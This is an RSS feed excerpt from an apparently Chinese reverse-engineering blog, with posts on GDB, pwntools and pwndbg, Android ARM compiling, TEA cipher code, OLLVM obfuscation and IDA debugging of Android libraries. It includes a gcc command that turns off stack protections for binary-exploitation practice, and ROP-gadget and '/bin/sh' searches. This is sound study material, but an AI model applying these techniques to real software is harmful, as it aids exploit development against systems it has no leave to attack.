&lt;td&gt;64位linux下面的GCC编译出一个32位可执行程序&lt;/td&gt;
&lt;td&gt;gcc -m32 -z execstack -fno-stack-protector -o level level.c&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&#34;gdb常用调试命令&#34;&gt;GDB常用调试命令&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;gcc -g  main.c                      //在目标文件加入源代码的信息
gdb a.out       

(gdb) start                         //开始调试
(gdb) n                             //一条一条执行
(gdb) step/s                        //执行下一条，如果函数进入函数
(gdb) backtrace/bt                  //查看函数调用栈帧
(gdb) info/i locals                 //查看当前栈帧局部变量
(gdb) frame/f                       //选择栈帧，再查看局部变量
(gdb) print/p                       //打印变量的值
(gdb) finish                        //运行到当前函数返回
(gdb) set var sum=0                 //修改变量值
(gdb) list/l 行号或函数名             //列出源码
(gdb) display/undisplay sum         //每次停下显示变量的值/取消跟踪
(gdb) break/b  行号或函数名           //设置断点
(gdb) continue/c                    //连续运行
(gdb) info/i breakpoints            //查看已经设置的断点
(gdb) delete breakpoints 2          //删除某个断点
(gdb) disable/enable breakpoints 3  //禁用/启用某个断点
(gdb) break 9 if sum != 0           //满足条件才激活断点
(gdb) run/r                         //重新从程序开头连续执行
(gdb) watch input[4]                //设置观察点
(gdb) info/i watchpoints            //查看设置的观察点
(gdb) x/7b input                    //打印存储器内容，b--每个字节一组，7--7组
(gdb) disassemble                   //反汇编当前函数或指定函数
(gdb) si                            // 一条指令一条指令调试 而 s 是一行一行代码
(gdb) info registers                // 显示所有寄存器的当前值
(gdb) x/20 $esp                    //查看内存中开始的20个数
ni 单步执行不进入 
si 单步执行并进入
disas addr 对地址addr处的指令进行反汇编，addr可以是函数名 
checksec 查看elf编译的保护选项。 
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;查壳&#34;&gt;查壳&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;upx -d file&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;objjump&#34;&gt;objjump&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;objdump是二进制文件快速查看工具。   常用命令：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;objdump -d [file]&lt;/code&gt; 查看文件的所有汇编代码&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;objdump -f [file]&lt;/code&gt; 查看文件的每个文件的整体头部摘要&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;####python&lt;/p&gt;

&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;python -c &amp;quot;...&amp;quot; | ./file&lt;/code&gt; python以命令方式执行并把结果传递给file&lt;/li&gt;
&lt;li&gt;&lt;code&gt;python -c &amp;quot;...&amp;quot; | xargs ./file&lt;/code&gt; python以命令方式执行并当作命令行参数传递给file，具体的是：“它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题。”存在这个命令是因为很多的参数不支持以管道的方式传递。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;os.system()&lt;/code&gt; 创建一个子进程&lt;/li&gt;
&lt;li&gt;&lt;code&gt;os.putenv(&amp;quot;name&amp;quot;, &amp;quot;value&amp;quot;)&lt;/code&gt; 添加一个环境变量&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;pwntools&#34;&gt;pwntools&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;参考
&lt;a href=&#34;http://pwntools.readthedocs.io/en/stable/&#34;&gt;http://pwntools.readthedocs.io/en/stable/&lt;/a&gt;   （官网介绍）&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://brieflyx.me/2015/python-module/pwntools-intro/&#34;&gt;http://brieflyx.me/2015/python-module/pwntools-intro/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://brieflyx.me/2015/python-module/pwntools-advanced/&#34;&gt;http://brieflyx.me/2015/python-module/pwntools-advanced/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;一般直接用from pwn import * 或者import pwn将所有模块导入到当前命名空间，这条语句还会把os、sys等常用的系统库一并导入。&lt;/p&gt;

&lt;p&gt;常用的模块有下面几个：
- ==asm==:汇编与反汇编
- ==dynelf==:用于远程符号泄露，需要提供leak方法
- ==elf==:对elf文件进行操作
- ==gdb==:配合gdb进行调试
- ==memleak==:用于内存泄漏
- ==shellcraft==: shellcode的生成器
- ==tubes==:包括tubes: 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE
- ==utils==:一些实用的小功能，例如CRC计算，cyclic pattern等&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;pwndbg&#34;&gt;pwndbg&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;arena 堆检查&lt;/li&gt;
&lt;li&gt;mp 显示堆&lt;/li&gt;
&lt;li&gt;bins,fastbins,unsorted,smallbins,largebins&lt;/li&gt;
&lt;li&gt;heap&lt;/li&gt;
&lt;li&gt;top_chunk&lt;/li&gt;
&lt;li&gt;procinfo 查看当前进程状态&lt;/li&gt;
&lt;li&gt;rop &lt;code&gt;rop --grep &amp;quot;pop rdi&amp;quot; -- --nojop --nosys --depth 2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;search &lt;code&gt;search -s “/bin/sh”&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;vvmap 虚拟内存映射&lt;/li&gt;
&lt;li&gt;telescope 检查内存转储&lt;/li&gt;
&lt;/ul&gt;
</description>
      
    </item>
    
    <item>
      <title>Android-ARM进阶</title>
      <link>https://naivete.cc/post/android-arm%E8%BF%9B%E9%98%B6/</link>
      <pubDate>Wed, 10 Oct 2018 16:40:20 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android-arm%E8%BF%9B%E9%98%B6/</guid>
      
        <description>

&lt;p&gt;学习一些关于ARM的汇编结构特点，以及分析。理解一些结构最好的方法就是多去尝试动手做。。&lt;/p&gt;

&lt;h3 id=&#34;ndk-build的使用&#34;&gt;NDK-Build的使用&lt;/h3&gt;

&lt;p&gt;可以参考&lt;a href=&#34;https://developer.android.com/ndk/guides/ndk-build?hl=zh-cn&#34;&gt;官方文档&lt;/a&gt;。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;创建一个Android项目&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;cd 项目目录&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;ndk&gt;/ndk-build   。也可以将NDK-build加入环境变量。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;创建jni文件夹，添加 Android.mk和 Application.mk两个文件。（参考官方文档）&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-mk&#34;&gt;   //Android.mk
   LOCAL_PATH := $(call my-dir)
   include $(CLEAR_VARS)
   
   # 要生成的.so库名称
   LOCAL_MODULE := hello
   # c++文件
   LOCAL_SRC_FILES := hello.cpp
   include $(BUILD_SHARED_LIBRARY)
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-mk&#34;&gt;   //Application.mk
   APP_PLATFORM := android-17
   # APP_ABI := all
   APP_ABI :=armeabi-v7a arm64-v8a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;添加hello.cpp：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;   #include&amp;lt;cstdio&amp;gt;
   int i,j;
   int num[] = {1,2,3,4,5};
   int main()
   {
       /* code */
       printf(&amp;quot;hello,world!\n&amp;quot;);
       for(i=0;i&amp;lt;5;i++){
           printf(&amp;quot;num value is %d\n&amp;quot;,num[i]);
       }
       return 0;
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;ndk-build&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180814152220.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;push 到Android设备运行&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这里ARM32位出现里非法引用（Illegal instruction）。。之后再试试&lt;/p&gt;

&lt;p&gt;改成ARM64之后又出现内存区段错误“Segmentation fault”  有毒呀。。可能是哪里设置有问题。。&lt;/p&gt;

&lt;h3 id=&#34;arm-linux-gcc交叉编译器编译&#34;&gt;arm-linux-gcc交叉编译器编译&lt;/h3&gt;

&lt;p&gt;arm-linux-gcc也能编译出ARM可执行文件。&lt;code&gt;sudo apt install g++-arm-linux-gnueabihf&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;或者下载&lt;a href=&#34;https://developer.arm.com/open-source/gnu-toolchain/gnu-rm/downloads&#34;&gt;二进制&lt;/a&gt;文件安装。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;arm-linux-gnueabihf-g++  -static  helloworld.cpp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;push进Android之后运行成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180814164353.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;使用这个方法和用NDK-build编译的有差异。&lt;/p&gt;

&lt;h3 id=&#34;for循环&#34;&gt;for循环&lt;/h3&gt;

&lt;p&gt;待添加&lt;/p&gt;

&lt;h3 id=&#34;if-else&#34;&gt;if-else&lt;/h3&gt;

&lt;p&gt;待添加&lt;/p&gt;

&lt;h3 id=&#34;while&#34;&gt;while&lt;/h3&gt;

&lt;h3 id=&#34;switch&#34;&gt;switch&lt;/h3&gt;

&lt;h3 id=&#34;优化&#34;&gt;优化&lt;/h3&gt;

&lt;p&gt;###C++&lt;/p&gt;

&lt;h3 id=&#34;jni-api分析&#34;&gt;JNI API分析&lt;/h3&gt;
</description>
      
    </item>
    
    <item>
      <title>TEA加密与解密</title>
      <link>https://naivete.cc/post/tea%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/</link>
      <pubDate>Tue, 11 Sep 2018 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/tea%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/</guid>
      
        <description>

&lt;h2 id=&#34;tea加密与解密&#34;&gt;TEA加密与解密&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://baike.baidu.com/item/TEA%E7%AE%97%E6%B3%95/10167844&#34;&gt;TEA算法&lt;/a&gt;由&lt;a href=&#34;https://baike.baidu.com/item/%E5%89%91%E6%A1%A5%E5%A4%A7%E5%AD%A6/278542&#34;&gt;剑桥大学&lt;/a&gt;计算机实验室的David Wheeler和Roger Needham于1994年发明。它是一种分组&lt;a href=&#34;https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95&#34;&gt;密码算法&lt;/a&gt;，其明文密文块为64比特，&lt;a href=&#34;https://baike.baidu.com/item/%E5%AF%86%E9%92%A5&#34;&gt;密钥&lt;/a&gt;长度为128比特。TEA算法利用不断增加的Delta(黄金分割率)值作为变化，使得每轮的加密是不同，该加密算法的&lt;a href=&#34;https://baike.baidu.com/item/%E8%BF%AD%E4%BB%A3&#34;&gt;迭代&lt;/a&gt;次数可以改变，建议的迭代次数为32轮。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在游戏项目中，一般需要对资源或数据进行加密保护，最简单高效的加密算法就是采用位与或之类的，但是比较容易被人分析出来。 TEA加密算法不但比较简单，而且有&lt;strong&gt;很强的抗差分分析能力&lt;/strong&gt;，&lt;strong&gt;加密速度也比较快&lt;/strong&gt;。可以根据项目需求设置加密轮数来增加加密强度。&lt;em&gt;主要运用了移位和异或运算。密钥在加密过程中始终不变。&lt;/em&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;差分分析是一种选择明文攻击，其基本思想是：通过分析特定明文差分对相对应密文差分影响来获得尽可能大的密钥。它可以用来攻击任何由迭代一个固定的轮函数的结构的密码以及很多分组密码（包括DES），它是由Biham和Shamir于1991年提出的选择明文攻击。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
&lt;li&gt;加密核心函数&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void EncryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key)
{
    unsigned int y = *firstChunk;
    unsigned int z = *secondChunk;
    unsigned int sum = 0;

    unsigned int delta = 0x9e3779b9;

    for (int i = 0; i &amp;lt; 8; i++)  //8轮运算(需要对应下面的解密核心函数的轮数一样)
    {
        sum += delta;
        y += ((z &amp;lt;&amp;lt; 4) + key[0]) ^ (z + sum) ^ ((z &amp;gt;&amp;gt; 5) + key[1]);
        z += ((y &amp;lt;&amp;lt; 4) + key[2]) ^ (y + sum) ^ ((y &amp;gt;&amp;gt; 5) + key[3]);
    }

    *firstChunk = y;
    *secondChunk = z;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
&lt;p&gt;算法使用了一个神秘常数δ作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但δ的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」&amp;ndash;&amp;gt;  delta = 0x9e3779b9;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
&lt;li&gt;解密核心函数&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;   void DecryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key)
   {
       unsigned int  sum = 0;
       unsigned int  y = *firstChunk;
       unsigned int  z = *secondChunk;
       unsigned int  delta = 0x9e3779b9;
   
       sum = delta &amp;lt;&amp;lt; 3; //32轮运算，所以是2的5次方；16轮运算，所以是2的4次方；8轮运算，所以是2的3次方
   
       for (int i = 0; i &amp;lt; 8; i++) //8轮运算
       {
           z -= (y &amp;lt;&amp;lt; 4) + key[2] ^ y + sum ^ (y &amp;gt;&amp;gt; 5) + key[3];
           y -= (z &amp;lt;&amp;lt; 4) + key[0] ^ z + sum ^ (z &amp;gt;&amp;gt; 5) + key[1];
           sum -= delta;
       }
   
       *firstChunk = y;
       *secondChunk = z;
   }
&lt;/code&gt;&lt;/pre&gt;
</description>
      
    </item>
    
    <item>
      <title>OLLVM 混淆之一</title>
      <link>https://naivete.cc/post/ollvm-%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80/</link>
      <pubDate>Mon, 10 Sep 2018 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/ollvm-%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80/</guid>
      
        <description>

&lt;h3 id=&#34;ollvm&#34;&gt;OLLVM&lt;/h3&gt;

&lt;p&gt;OLLVM(Obfuscator-LLVM)是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个针对LLVM代码混淆项目， 用于增加逆向难度，保护代码的安全。最新版本为&lt;a href=&#34;https://github.com/obfuscator-llvm/obfuscator/tree/llvm-4.0&#34;&gt;4.0&lt;/a&gt;。OLLVM适用LLVM支持的所有语言（C, C++, Objective-C, Ada 和 Fortran）和目标平台（x86, x86-64, PowerPC, PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore）。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://llvm.org/&#34;&gt;LLVM&lt;/a&gt;是lowlevel virtual machine的简称，是一个编译器框架。详细介绍可以看&lt;a href=&#34;https://zh.wikipedia.org/wiki/LLVM&#34;&gt;WIKI-LLVM&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180823112535.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;经典的三段式设计，前端使用不同的编译工具对代码进行分析转换成LLVM的中间表示IR（intermediate representation）。中间部分优化器只对IR进行操作，通过一系列的Pass对IR做优化。后端主要是讲优化好的IR解释成对应的机器码。&lt;/p&gt;

&lt;p&gt;对IR的处理过程下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180823113111.png&#34; alt=&#34;IR Pass&#34; /&gt;&lt;/p&gt;

&lt;p&gt;OLLVM的混淆操作在IR层，通过编写Pass来混淆IR，以致后端生成的目标代码也被混淆了。&lt;/p&gt;

&lt;h3 id=&#34;ollvm-android环境搭建&#34;&gt;OLLVM-Android环境搭建&lt;/h3&gt;

&lt;p&gt;前提环境：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;NDK环境&lt;/li&gt;
&lt;li&gt;LLVM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下载源码(包括了LLVM和Clang)-编译OLLVM步骤如下：&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git
$ mkdir build
$ cd build
$ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/
//（cmake -G &amp;quot;MinGW Makefiles&amp;quot; -DCMAKE_BUILD_TYPE=Release ../obfuscator/）(windows)
$ make -j7   //这个数字自己看自己CPU填 太小可能非常编译慢 
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;可以参照&lt;a href=&#34;https://github.com/obfuscator-llvm/obfuscator/wiki&#34;&gt;官方wiki&lt;/a&gt;来操作。编译完成后，二进制文件放在build/bin目录下。&lt;/p&gt;

&lt;p&gt;配置整合NDK：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;打开NDK目录ndk-bundle下的toolchains，新建obfuscator-llvm-4，将llvm文件夹里的所有文件复制到新建的目录下。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;将&lt;code&gt;\build\bin&lt;/code&gt;目录下的&lt;code&gt;clang.exe&lt;/code&gt;、&lt;code&gt;clang++.exe&lt;/code&gt;和&lt;code&gt;clang-format.exe&lt;/code&gt;复制到&lt;code&gt;\toolchains\llvm\prebuilt\windows-x86_64\bin&lt;/code&gt;目录下，直接替换掉其中的文件。（Windows下）&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;（linux下)将llvm目录下的prebuilt目录和文件 config.mk、setup.mk和setup-common.mk拷贝到创建的obfuscator-llvm目录下-&amp;gt;然后替换obfuscator-llvm/prebuilt/linux-x86下的bin和lib为我们编译好的bin和lib&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;然后将下面文件复制一份，改名称如下，比如arm-linux-androideabi-clang3.4复制一行改名为arm-linux-androideabi-obfuscator3.4&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;arm-linux-androideabi-clang3.4-&amp;gt; arm-linux-androideabi-obfuscator3.4&lt;/p&gt;

&lt;p&gt;mipsel-linux-android-clang3.4-&amp;gt; mipsel-linux-android-obfuscator3.4&lt;/p&gt;

&lt;p&gt;x86-clang3.4-&amp;gt; x86-obfuscator3.4&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;分别修改以上三个文件的 setup.mk 中的 LLVM_NAME ，即将其指定到开始建立的obfuscator-llvm-3.4目录，也就是把把&lt;code&gt;LLVM_NAME := llvm-$(LLVM_VERSION)改成LLVM_NAME := obfuscator-llvm-$(LLVM_VERSION)&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;如果是配置64位的ndk配置,还要额外修改$NDK_PATH/build/core/setup-toolchain.mk文件，在NDK_64BIT_TOOLCHAIN_LIST := 加入 obfuscator 对应的NDK_TOOLCHAIN_VERSION NDK_64BIT_TOOLCHAIN_LIST := obfuscator3.4 clang3.6 clang3.5 clang3.4 4.9&amp;rsquo;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;开始使用ollvm&#34;&gt;开始使用OLLVM&lt;/h3&gt;

&lt;h3 id=&#34;参考&#34;&gt;参考&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.freebuf.com/articles/terminal/130142.html&#34;&gt;http://www.freebuf.com/articles/terminal/130142.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/&#34;&gt;https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.jmpoep.com/thread-4016-1-1.html&#34;&gt;https://www.jmpoep.com/thread-4016-1-1.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;BCTFhttp://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html&lt;/li&gt;
&lt;/ul&gt;
</description>
      
    </item>
    
    <item>
      <title>IDA 动态调试.so 基本步骤</title>
      <link>https://naivete.cc/post/ida-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so-%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</link>
      <pubDate>Fri, 31 Aug 2018 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/ida-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so-%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</guid>
      
        <description>

&lt;h2 id=&#34;ida-动态调试-so-基本步骤&#34;&gt;IDA 动态调试.so 基本步骤&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;待补图&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;0x00-ida快捷键&#34;&gt;0x00 IDA快捷键&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Shirt+F12 字符串窗口&lt;/li&gt;
&lt;li&gt;F5大法好 反汇编&lt;/li&gt;
&lt;li&gt;Ctrl+S  查看so对应段的信息（非调试），快速定位so文件的内存地址（Debug）&lt;/li&gt;
&lt;li&gt;G 快速跳转到对应地址。s&lt;/li&gt;
&lt;li&gt;调试-F7单步进入调试、F8单步、F9运行&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;0x01-方法一&#34;&gt;0x01 方法一&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;获取运行Android_server。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;android_server文件放在IDA安装目录下的\dbgsrv目录下 注意版本的不同。&lt;/p&gt;

&lt;p&gt;之后只需 &lt;code&gt;push android_server /data/local/tmp/&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;之后&lt;code&gt;adb shell&lt;/code&gt;，&lt;code&gt;su&lt;/code&gt; ，&lt;code&gt;cd /data/local/tmp/&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;可能还得&lt;code&gt;chmod 755 android_server&lt;/code&gt; 才有权限运行。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;建立通信、attach进程。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;adb forward tcp:23946 tcp:23946&lt;/code&gt;命令。&lt;/p&gt;

&lt;p&gt;在IDA的Debugger选项中attach进程。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;加载so、找函数下断点&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;双开IDA ，Ctrl+S找到so文件的基地址，另外一个IDA找到函数的相对地址。相加得到绝对地址。&lt;/p&gt;

&lt;h4 id=&#34;0x02-方法二&#34;&gt;0x02 方法二&lt;/h4&gt;

&lt;p&gt;无法加载so文件需要在加载之前断点。反调试之类&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Debug方式启动app。需要应用可调试开启&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;adb shell am start -D -n 包名/.MainActivity&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;方法一的1，2两步 勾选选项。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;jdb attach程序&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;开始调试 同上

&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
      
    </item>
    
    <item>
      <title>Android应用安全防护和逆向分析-基础篇5-6</title>
      <link>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/</link>
      <pubDate>Wed, 29 Aug 2018 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/</guid>
      
        <description>

&lt;h2 id=&#34;一-基础篇⑤-⑥&#34;&gt;一、 基础篇⑤-⑥&lt;/h2&gt;

&lt;p&gt;这两章主要描述AndroidManifest.xml和resourec.arsc这两个android文件。内容不是很多，下面是两章的笔记。&lt;/p&gt;

&lt;h3 id=&#34;第五章-androidmanifest-xml格式解析&#34;&gt;第五章 AndroidManifest.xml格式解析&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829165213.png&#34; alt=&#34;AndroidManifest.xml&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;center&gt;AndroidManifest.xml文件格式图&lt;/center&gt;&lt;/p&gt;

&lt;h5 id=&#34;头部信息&#34;&gt;头部信息&lt;/h5&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;文件魔数：4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;文件大小：4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Chunk内容 头部相同（ChunkType(4bytes)、ChunkSize(4bytes)）。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Sting Chunk&lt;/strong&gt; ：主要用于存放AndroidManifest.xml文件中所有的字符串信息。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ChunkType：类型，固定4bytes（0x001C001)。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ChunkSize：大小，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StringCount：字符串的个数 ，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StyleCount ：样式的个数，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Unknown ：位置区域。4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StringPoolOffset ：字符串池的偏移值。4bytes。偏移值相对于StringChunk头部的位置。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StylePoolOffset : 样式池的偏移值。4bytes。没有Style可忽略。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StringOffsets ：每一个字符串的偏移值，大小为StringChunk*4。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StyleOffsets：每个样式的偏移值，大小为StyleChunk*4。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如何读取这个文件？&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Resourceld Chunk&lt;/strong&gt; ：主要用来存放AndroidManifest 中用到的系统属性值对应的资源ID&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ChunkType：类型，固定4bytes（0x00080108）。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ChunkSize：大小，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ResourceIds : 内容，大小为Resourceld Chunk大小除以4减去头部的8字节。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;解析？&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Start Namespace Chunk&lt;/strong&gt;：主要包含了AndroidMaifest文件中的命名空间的内容，android中的xml都是采用Schema格式（两种格式DTD和Schema）的，所有肯定有Prefix和URI。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Chunk Type：类型，固定4bytes。（0x00100100)。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Chunk Size：大小，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Line Number ：AndroidMaifest文件中行号，4bytes。&lt;/p&gt;&lt;/li&gt;

